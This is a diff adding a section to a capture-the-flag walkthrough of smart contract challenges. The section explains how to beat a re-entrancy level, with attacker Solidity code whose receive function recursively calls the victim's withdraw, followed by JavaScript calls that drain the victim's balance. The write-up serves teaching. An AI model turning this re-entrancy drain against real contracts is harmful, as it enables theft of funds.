@@ -351,3 +351,59 @@ receive() external payable {
 ```js
 await yourContract.becomeKing({ value: 1000000000000002 });
 ```
+
+---
+
+### 11. Re-entrancy
+
+The trick here is tho iterate between the `withdraw` function and our contract `receive` function in order to avoid the
+
+```sol
+balances[msg.sender] -= _amount;
+``` 
+
+line to be called. To make this work we need to do a recursion using our contracts `receive` function by doing another call to the withdraw function.
+
+```sol
+function withdraw(uint _amount) public {
+  if(balances[msg.sender] >= _amount) {
+    // The next line will call our receive function
+    // and our receive function will call withdraw again.
+    (bool result,) = msg.sender.call{value:_amount}("");
+    // ...
+```
+
+We should set a closing condition in order the prevent running out of gas, the condition in this case might be the victim's contract balance equals to zero.
+
+```sol
+receive() external payable {
+  if(victim.balance > 0) {
+    ReentranceInterface(victim).withdraw(msg.value);
+  }
+}
+```
+But before trying to call the withdraw function, we must donate to the contract in order to pass the first condition, therefore we should also donate from our attacker contract.
+
+```sol
+function donate() public payable {
+  ReentranceInterface(victim).donate{ value: msg.value }(address(this));
+}
+```
+
+We make our first donation, its important to use a value divisible by the current victim's balance in order to leave the victim's contract with zero balance. In each iteration we are going to steal the exact donation amount.
+
+In this case, the victim's balance is 0.001 Ether, so we are going to donate this amount.
+
+```js
+await attackerContract.donate({value: 1000000000000000})
+```
+
+Then we just call: 
+
+```js
+await sendTransaction({ to: attackerContract.address, value: 1000000000000000 });
+```
+
+This line will trigger the `receive` function on our attacker contract and start the recursion. Once the victim balance is zero, the `receive` function will return.
+
+
